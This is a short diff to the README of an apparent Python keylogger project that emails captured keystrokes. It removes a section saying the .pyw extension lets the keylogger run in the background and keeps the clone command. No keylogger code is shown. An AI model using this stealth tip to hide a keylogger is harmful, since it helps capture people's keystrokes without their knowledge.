@@ -22,9 +22,5 @@ The libraries required can be installed via:
 
 > `git clone https://github.com/reach-the-sky/Pyhton-Keylogger-mail.git
 
-##### To run the python file in background
-
-> Use keylogger_public.pyw (This extension allows you to run python script in the background).
-
 If you liked my project and appreciate the content I opensource, consider following me on github [🌥](https://github.com/reach-the-sky).
 
